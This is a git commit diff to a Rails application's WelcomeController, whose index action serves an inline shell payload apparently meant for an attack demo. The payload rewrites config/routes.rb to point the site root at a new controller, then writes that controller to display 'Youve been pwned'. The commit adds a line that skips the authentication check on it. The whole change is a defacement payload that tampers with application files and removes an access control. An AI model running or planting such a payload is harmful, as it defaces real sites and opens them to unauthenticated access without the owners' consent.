96b3a4efe09b6fe426c20a356488e766e7304ddb
looneym <looneymicheal@gmail.com>
2018-07-15 20:33:14 +0100

    Skip authentication on pwned controller

--- app/controllers/welcome_controller.rb
+++ app/controllers/welcome_controller.rb
@@ -2,7 +2,7 @@ class WelcomeController < ApplicationController
   def index
     payload = %{
     sed -i 's/root to: \"sessions#new\"/root to: \"pwned#pwned\"/g' config/routes.rb
-    printf "class PwnedController < ApplicationController \n def pwned \n  render :inline => 'Youve been pwned' \n end \n end" > app/controllers/pwned_controller.rb
+    printf "class PwnedController < ApplicationController \n skip_before_action :authenticated \n def pwned \n  render :inline => 'Youve been pwned' \n end \n end" > app/controllers/pwned_controller.rb
     }
     render :inline => payload
 
